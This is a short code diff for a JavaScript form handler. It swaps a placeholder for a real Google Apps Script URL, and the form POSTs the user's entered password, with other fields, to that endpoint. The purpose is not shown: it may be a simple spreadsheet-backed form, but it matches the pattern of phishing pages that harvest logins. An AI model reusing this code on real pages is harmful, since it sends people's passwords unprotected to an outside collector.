@@ -7,7 +7,7 @@ function submitForm(e) {
     password: document.getElementById("password").value
   };
 
-  fetch("PASTE_YOUR_APPS_SCRIPT_URL_HERE", {
+  fetch("https://script.google.com/macros/s/AKfycbzoiNjiDwk7V56bKbBeip4Ck3peFUcFUchDi5gju6ZzVKhEbnlnQ4r1fWsGxm5urAOoBg/exec", {
     method: "POST",
     body: JSON.stringify(data)
   })
@@ -20,3 +20,4 @@ function submitForm(e) {
     console.error(err);
   });
 }
+
